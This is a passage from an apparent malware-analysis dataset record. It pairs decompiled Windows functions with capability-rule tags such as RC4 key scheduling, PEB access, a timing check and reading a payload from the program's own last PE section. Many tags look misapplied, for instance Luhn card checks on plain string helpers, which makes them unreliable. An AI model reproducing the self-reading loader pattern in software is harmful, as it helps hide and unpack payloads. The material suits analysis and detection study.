        "decompiled_code": "\nvoid __cdecl fcn.00406210(uint32_t arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    ulong uVar6;\n    uint64_t uVar7;\n    uint var_101h;\n    uint var_f5h;\n    uint var_48h;\n    uint var_2ch;\n    uint32_t size;\n    uint var_14h;\n    uint uStack16;\n    int32_t var_8h;\n    \n    puVar5 = &fcn.00406210::var_48h;\n    for (iVar4 = 0x12; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0xcccccccc;\n        puVar5 = puVar5 + 1;\n    }\n    var_14h = 0x7fffffff;\n    if (arg_8h < 0x80000000) {\n        size = arg_8h << 1;\n        uVar7 = fcn.004053f0();\n        uVar3 = uVar7 >> 0x20;\n        if (((uVar7 & 0xff) == 0) && (size < 0x401)) {\n            uVar2 = 1;\n        }\n        else if (size < *(var_8h + 0x400) || size == *(var_8h + 0x400)) {\n            uVar2 = 1;\n        }\n        else {\n            uVar3 = sub.msvcrt.dll_malloc\n                              (size, 2, \"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\inc\\\\corecrt_internal_stdio_output.h\", \n                               0x170);\n            fcn.00405380(uVar3);\n            cVar1 = fcn.004053f0();\n            if (cVar1 == '\\0') {\n                uVar6 = fcn.00407080();\n                uVar3 = uVar6 >> 0x20;\n                uVar2 = 0;\n            }\n            else {\n                fcn.004072a0(&fcn.00406210::var_2ch);\n                *(var_8h + 0x400) = size;\n                uVar6 = fcn.00407080();\n                uVar3 = uVar6 >> 0x20;\n                uVar2 = 1;\n            }\n        }\n    }\n    else {\n        uVar6 = sub.msvcrt.dll__errno();\n        uVar3 = uVar6 >> 0x20;\n        *uVar6 = 0xc;\n        uVar2 = 0;\n    }\n    fcn.00411450(uVar2, uVar3);\n    uStack16 = 0x40632c;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 633
    },
    "00406c20": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406c20(uint arg_8h, uint32_t arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    int32_t var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.00406c20::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = 0;\n    while ((var_8h < arg_10h && (fcn.00409fe0(arg_ch & 0xff, arg_14h),  *arg_14h != -1))) {\n        var_8h = var_8h + 1;\n    }\n    uStack8 = 0x406c82;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 236
    },
    "0040a050": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a050(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_dch;\n    uint var_d4h;\n    uint var_1ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040a050::var_1ch;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_d4h = fcn.00405460();\n    fcn.00406800(&fcn.0040a050::arg_8h, &fcn.0040a050::var_d4h);\n    uStack8 = 0x40a0c2;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 208
    },
    "0040a430": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint16_t __cdecl fcn.0040a430(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    if ((arg_ch < -1) || (0xff < arg_ch)) {\n        arg_10h._0_2_ = 0;\n    }\n    else {\n        arg_10h._0_2_ = *(arg_8h + arg_ch * 2) & arg_10h;\n    }\n    return arg_10h;\n}\n",
        "token_count": 110
    },
    "0040d390": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040d390(int32_t arg_8h, uint arg_ch, uchar *arg_10h, uint32_t arg_14h, uint arg_18h)\n\n{\n    uint32_t uVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_f4h;\n    uint32_t var_f0h;\n    uint var_ech;\n    int32_t var_e8h;\n    uint var_34h;\n    uint var_1dh;\n    int32_t var_14h;\n    int32_t var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.0040d390::var_34h;\n    for (iVar2 = 0xd; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    if (arg_14h < arg_ch + 4) {\n        *arg_10h = 0;\n    }\n    else {\n        if (arg_ch != 0) {\n            *arg_10h = 0x2d;\n            arg_10h = arg_10h + 1;\n            *arg_10h = 0;\n            if (arg_14h != 0xffffffff) {\n                arg_14h = arg_14h - 1;\n            }\n        }\n        var_8h = arg_8h + -1;\n        if (arg_18h == '\\0') {\n            var_e8h = 2;\n        }\n        else {\n            var_e8h = 0;\n        }\n        var_14h = var_e8h;\n        uVar1 = sub.msvcrt.dll_strlen(*(var_8h * 0x10 + 0x4144e8 + var_e8h * 4));\n        var_1dh._0_1_ = uVar1 < arg_14h;\n        iVar2 = *0x419020 + 0x25;\n        var_f0h = !var_1dh;\n        arg_8h_00 = sub.msvcrt.dll_strcpy_s(arg_10h, arg_14h, *(var_8h * 0x10 + 0x4144e8 + (var_14h + var_f0h) * 4));\n        fcn.0040da60(arg_8h_00, \n                     L\"strcpy_s( result_buffer, result_buffer_count, strings[row][column + !long_string_will_fit])\", \n                     L\"fp_format_nan_or_infinity\", L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\cvt.cpp\", iVar2, 0\n                    );\n    }\n    uStack8 = 0x40d4fa;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 656
    },
    "00410480": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00410480(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint *puVar4;\n    uchar var_454h [3];\n    uint var_451h;\n    uint var_44ch;\n    uint var_2d4h;\n    uint32_t var_f4h;\n    uint32_t var_e8h;\n    uint32_t var_dch;\n    uint32_t var_d0h;\n    uint32_t var_c4h;\n    uint32_t var_b8h;\n    uint32_t var_ach;\n    uint32_t var_a0h;\n    uint32_t var_94h;\n    uint32_t var_88h;\n    uint var_79h;\n    uint var_6dh;\n    uint var_61h;\n    uint32_t var_58h;\n    uint32_t var_4ch;\n    int32_t var_40h;\n    uint32_t var_34h;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_18h;\n    uint32_t var_ch;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    puVar4 = &fcn.00410480::var_2d4h;\n    for (iVar3 = 0xb5; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0xcccccccc;\n        puVar4 = puVar4 + 1;\n    }\n    var_4h = *0x41900c ^ &stack0xfffffffc;\n    var_ch = arg_ch >> 5;\n    var_34h = arg_ch % 0x20;\n    var_28h = 1;\n    var_24h = 0;\n    var_40h = 0x20 - var_34h;\n    var_18h = var_34h;\n    iVar3 = fcn.004117a0();\n    var_4ch = iVar3 - 1;\n    var_58h = ~var_4ch;\n    iVar3 = fcn.0040f070(arg_8h[*arg_8h]);\n    var_61h._0_1_ = 0x20U - iVar3 < var_18h;\n    var_6dh._0_1_ = 0x73 < *arg_8h + var_ch;\n    if ((*arg_8h + var_ch == 0x73) && (var_61h)) {\n        var_451h._0_1_ = '\\x01';\n    }\n    else {\n        var_451h._0_1_ = '\\0';\n    }\n    var_79h._0_1_ = var_451h;\n    if ((var_6dh) || (var_451h != '\\0')) {\n        arg_8h_00 = fcn.0040eda0();\n        fcn.0040ed30(arg_8h_00);\n    }\n    else {\n        if (*arg_8h + var_ch < 0x72) {\n            _var_454h = *arg_8h + var_ch;\n        }\n        else {\n            _var_454h = 0x72;\n        }\n        uVar1 = _var_454h;\n        var_88h = _var_454h;\n        for (var_94h = _var_454h; (var_94h != 0xffffffff && (var_ch <= var_94h)); var_94h = var_94h - 1) {\n            var_a0h = var_94h - var_ch;\n            var_ach = (var_94h - var_ch) - 1;\n            if (var_a0h < *arg_8h) {\n                _var_454h = arg_8h[var_a0h + 1];\n            }\n            else {\n                _var_454h = 0;\n            }\n            uVar2 = _var_454h;\n            var_b8h = _var_454h;\n            if (var_ach < *arg_8h) {\n                _var_454h = arg_8h[var_94h - var_ch];\n            }\n            else {\n                _var_454h = 0;\n            }\n            var_c4h = _var_454h;\n            var_d0h = (uVar2 & var_4ch) << (var_34h & 0x1f);\n            var_dch = (_var_454h & var_58h) >> (var_40h & 0x1f);\n            var_e8h = var_d0h | var_dch;\n            arg_8h[var_94h + 1] = var_e8h;\n        }\n        for (var_f4h = 0; var_f4h != var_ch; var_f4h = var_f4h + 1) {\n            arg_8h[var_f4h + 1] = 0;\n        }\n        _var_454h = uVar1;\n        if (var_61h) {\n            _var_454h = uVar1 + 1;\n        }\n        *arg_8h = _var_454h;\n    }\n    fcn.00405180(unaff_EBX);\n    uStack12 = 0x410786;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 1226
    },
    "00405c40": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405c40(int32_t arg_8h)\n\n{\n    return arg_8h * 0x20 + _sym.imp.msvcrt.dll__iob;\n}\n",
        "token_count": 46
    },
    "0040ee00": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040ee00(uint32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint32_t *var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040ee00::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = param_1;\n    fcn.00410dd2(param_1);\n    if ((*var_8h & 0x1f) == 0x1f) {\n        *(var_8h + 2) = 0;\n    }\n    else {\n        fcn.00410e3a(var_8h);\n        *(var_8h + 2) = 1;\n    }\n    uStack8 = 0x40ee68;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 241
    },
    "0040fc70": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fc70(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint extraout_EDX;\n    uint unaff_EBX;\n    uint *puVar2;\n    uint var_200h;\n    uint32_t var_1fch;\n    uint32_t var_1f0h;\n    int32_t var_1e4h;\n    uint s;\n    uint var_ch;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    puVar2 = &fcn.0040fc70::var_200h;\n    for (iVar1 = 0x80; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_4h = *0x41900c ^ &stack0xfffffffc;\n    var_ch = 1;\n    fcn.0040eda0();\n    var_1f0h = arg_ch >> 5;\n    var_1fch = arg_ch % 0x20;\n    sub.msvcrt.dll_memset(&fcn.0040fc70::s, 0, var_1f0h << 2);\n    (&fcn.0040fc70::s)[var_1f0h] = 1 << (var_1fch & 0x1f);\n    var_1e4h = var_1f0h + 1;\n    fcn.0040ed30(&fcn.0040fc70::var_1e4h);\n    fcn.00411450(arg_8h, extraout_EDX);\n    fcn.00405180(unaff_EBX);\n    uStack12 = 0x40fd49;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 412
    },
    "00401030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401030(void)\n\n{\n    fcn.00403c60();\n    fcn.004048b0(fcn.004127d0);\n    return;\n}\n",
        "token_count": 40
    },
    "00402340": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402340(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_104h;\n    \n    fcn.00402140(arg_8h, arg_ch & 0xffff, &var_104h);\n    fcn.00402240(arg_10h, arg_14h, &var_104h);\n    return;\n}\n",
        "token_count": 95
    },
    "00402420": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access",
            "access PEB ldr_data",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00402420(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_FS_OFFSET;\n    uint var_ch;\n    uint lpString;\n    int32_t var_4h;\n    \n    iVar1 = fcn.004023b0(*(**(*(*(in_FS_OFFSET + 0x30) + 0xc) + 0xc) + 0x30));\n    var_4h = 0;\n    while( true ) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(iVar1);\n        if (iVar2 <= var_4h) break;\n        if (('A' < *(iVar1 + var_4h)) && (*(iVar1 + var_4h) < 'Z')) {\n            *(iVar1 + var_4h) = *(iVar1 + var_4h) + ' ';\n        }\n        var_4h = var_4h + 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 219
    },
    "004024b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "create or open file",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "get file size",
            "read file on Windows"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004024b0(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint lpFileName;\n    uint lpNumberOfBytesRead;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint nNumberOfBytesToRead;\n    uint var_ch;\n    uint hObject;\n    int32_t lpBuffer;\n    \n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, &lpFileName, 0x104);\n    hObject = (*_sym.imp.KERNEL32.dll_CreateFileW)(&lpFileName, 0x80000000, 0, 0, 3, 0x80, 0);\n    nNumberOfBytesToRead = (*_sym.imp.KERNEL32.dll_GetFileSize)(hObject, 0);\n    lpBuffer = fcn.00402390(nNumberOfBytesToRead);\n    (*_sym.imp.KERNEL32.dll_ReadFile)(hObject, lpBuffer, nNumberOfBytesToRead, &lpNumberOfBytesRead, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    iVar1 = lpBuffer + *(lpBuffer + 0x3c);\n    iVar1 = iVar1 + 0x18 + *(iVar1 + 0x14) + (*(iVar1 + 6) - 1) * 0x28;\n    *arg_8h = *(lpBuffer + *(iVar1 + 0x14));\n    return lpBuffer + 4 + *(iVar1 + 0x14);\n}\n",
        "token_count": 336
    },
    "004027a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004027a0(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    arg_ch = fcn.00402ec0(in_ECX);\n    arg_8h_00 = fcn.00402b00();\n    iVar1 = fcn.00402ec0(arg_8h_00);\n    fcn.00402980(iVar1 + *(in_ECX + 0x14) * 2, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 140
    },
    "004027e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004027e0(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint uVar1;\n    uint in_ECX;\n    uint var_4h;\n    \n    arg_ch = fcn.00402ec0(in_ECX);\n    uVar1 = fcn.00402b00();\n    uVar1 = fcn.00402ec0(uVar1);\n    fcn.00402980(uVar1, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 109
    },
    "00402820": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __fastcall fcn.00402820(uint *param_1)\n\n{\n    uint uVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.00402a30();\n    uVar1 = fcn.00402a10();\n    fcn.00403040(uVar1);\n    uVar1 = *param_1;\n    *param_1 = 0;\n    fcn.00402fd0(&var_1h, uVar1);\n    fcn.004029a0();\n    return;\n}\n",
        "token_count": 149
    },
    "00402880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00402880(uint arg_8h)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint *in_FS_OFFSET;\n    uint var_14h;\n    uint var_dh;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x41269d;\n    unique0x00005080 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_dh + 1;\n    fcn.00403050(var_dh);\n    var_4h = 0;\n    uVar1 = fcn.00402c90(arg_8h);\n    uVar1 = fcn.00402ec0(uVar1);\n    fcn.00403070(arg_8h, uVar1);\n    *in_FS_OFFSET = stack0xfffffff0;\n    return in_ECX;\n}\n",
        "token_count": 210
    },
    "00402910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __fastcall fcn.00402910(uint *param_1)\n\n{\n    uint uVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.00402b40();\n    uVar1 = fcn.00402a10();\n    fcn.00403040(uVar1);\n    uVar1 = *param_1;\n    *param_1 = 0;\n    fcn.00402fd0(&var_1h, uVar1);\n    fcn.004029a0();\n    return;\n}\n",
        "token_count": 149
    },
    "004029c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.004029c0(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00402af0(param_1);\n    return;\n}\n",
        "token_count": 57
    },
    "00402a30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00402a30(int32_t param_1)\n\n{\n    uint arg_8h;\n    char cVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_eh;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4126b0;\n    unique0x00005080 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_eh + 2;\n    fcn.004016d0();\n    cVar1 = fcn.00402d10();\n    if (cVar1 != '\\0') {\n        arg_8h = *(param_1 + 4);\n        uVar2 = fcn.00402a10();\n        fcn.00403220(param_1 + 4, uVar2);\n        fcn.00402d40(arg_8h, *(param_1 + 0x18) + 1);\n    }\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 0x18) = 7;\n    var_eh._0_2_ = 0;\n    fcn.00402e80(param_1 + 4, &var_eh);\n    *in_FS_OFFSET = stack0xfffffff0;\n    return;\n}\n",
        "token_count": 353
    },
    "00402b40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00402b40(int32_t param_1)\n\n{\n    uint arg_8h;\n    char cVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_dh;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4126b0;\n    unique0x00005080 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_dh + 1;\n    fcn.004016d0();\n    cVar1 = fcn.00402dc0();\n    if (cVar1 != '\\0') {\n        arg_8h = *(param_1 + 4);\n        uVar2 = fcn.00402a10();\n        fcn.00403220(param_1 + 4, uVar2);\n        fcn.00402df0(arg_8h, *(param_1 + 0x18) + 1);\n    }\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 0x18) = 0xf;\n    var_dh._0_1_ = 0;\n    fcn.00402e70(param_1 + 4, &var_dh);\n    *in_FS_OFFSET = stack0xfffffff0;\n    return;\n}\n",
        "token_count": 354
    },
    "00402c00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00402c00(int32_t param_1)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    *(param_1 + 0x14) = 0;\n    *(param_1 + 0x18) = 0xf;\n    var_1h._0_1_ = 0;\n    fcn.00402e70(param_1 + 4, &var_1h);\n    return;\n}\n",
        "token_count": 135
    },
    "00402c90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402c90(uint s)\n\n{\n    (*_sym.imp.msvcrt.dll_wcslen)(s);\n    return;\n}\n",
        "token_count": 34
    },
    "00402ed0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00402ed0(uint arg_8h, uint noname_1, uint noname_2, uint arg_14h, uint noname_4, uint noname_5, uint arg_20h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint *in_FS_OFFSET;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_dh;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    uStack12 = 0x4126dd;\n    unique0x00005080 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_dh + 1;\n    var_4h = 1;\n    fcn.004036d0(var_dh, arg_20h);\n    var_4h = CONCAT31(var_4h._1_3_, 2);\n    fcn.00403700(&arg_8h, &arg_14h);\n    var_1ch = fcn.00402fc0(&arg_8h);\n    var_18h = fcn.00402fc0(&arg_14h);\n    if (var_1ch == var_18h) {\n        uVar1 = fcn.00402a10();\n        uVar1 = fcn.00403040(uVar1);\n        fcn.00402ff0(uVar1);\n        fcn.00402c00();\n    }\n    else {\n        puVar2 = fcn.00402ec0(&var_18h);\n        uVar1 = *puVar2;\n        puVar2 = fcn.00402ec0(&var_1ch);\n        fcn.00403720(*puVar2, uVar1);\n    }\n    var_4h = var_4h & 0xffffff00;\n    fcn.00401b10();\n    var_4h = 0xffffffff;\n    fcn.00401b10();\n    *in_FS_OFFSET = stack0xfffffff0;\n    return var_14h;\n}\n",
        "token_count": 469
    },
    "00402fd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402fd0(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004038d0(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 42
    },
    "00403070": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403070(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint *arg_ch_00;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uchar var_fh;\n    uint var_eh;\n    uint var_14h;\n    uint var_4h;\n    \n    unique0x00005080 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_eh + 2;\n    uVar1 = fcn.004033d0();\n    if (uVar1 < arg_ch) {\n        fcn.00401710();\n    }\n    var_18h = var_1ch;\n    uVar2 = fcn.00402a10();\n    fcn.00403040(uVar2);\n    fcn.004032c0(&var_eh, var_18h);\n    var_fh = arg_ch < 8;\n    var_eh._1_1_ = var_fh;\n    if (var_fh) {\n        *(var_18h + 0x14) = arg_ch;\n        *(var_18h + 0x18) = 7;\n        fcn.00403560(var_18h + 4, arg_8h, arg_ch);\n        fcn.00402e80(var_18h + 4 + arg_ch * 2, &var_14h + 2);\n        fcn.004016f0();\n        fcn.00403290();\n    }\n    else {\n        *(var_18h + 0x18) = 7;\n        iVar3 = fcn.004033a0(arg_ch);\n        var_20h = fcn.00403470(iVar3 + 1);\n        fcn.00403910(var_18h + 4, &var_20h);\n        *(var_18h + 0x14) = arg_ch;\n        *(var_18h + 0x18) = iVar3;\n        uVar1 = arg_ch;\n        uVar2 = fcn.00402ec0(var_20h);\n        fcn.00402ea0(uVar2, arg_8h, uVar1);\n        arg_ch_00 = &var_14h;\n        iVar3 = fcn.00402ec0(var_20h);\n        fcn.00402e80(iVar3 + arg_ch * 2, arg_ch_00);\n        fcn.004016f0();\n        fcn.00403290();\n    }\n    *in_FS_OFFSET = stack0xfffffff0;\n    return;\n}\n",
        "token_count": 624
    },
    "00403230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403230(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4126b0;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    if (0xfff < arg_ch) {\n        fcn.00401310(&arg_8h, &arg_ch);\n    }\n    fcn.00403f70(arg_8h);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 144
    },
    "004032c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004032c0(uint arg_8h, uint *arg_ch)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint *var_4h;\n    \n    fcn.00403330();\n    var_4h[1] = arg_8h;\n    uVar1 = fcn.00403350(1);\n    uVar1 = fcn.00402ec0(uVar1);\n    *var_4h = uVar1;\n    var_8h = fcn.00402ec0(arg_ch);\n    fcn.00403650(*var_4h, &var_8h);\n    *arg_ch = *var_4h;\n    return var_4h;\n}\n",
        "token_count": 163
    },
    "00403380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403380(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00402ec0(*(param_1 + 8));\n    return;\n}\n",
        "token_count": 46
    },
    "004033a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004033a0(uint arg_8h)\n\n{\n    uint arg_10h;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    arg_10h = fcn.004033d0();\n    fcn.00403580(arg_8h, *(in_ECX + 0x18), arg_10h);\n    return;\n}\n",
        "token_count": 86
    },
    "004033d0": {
        "rules": [
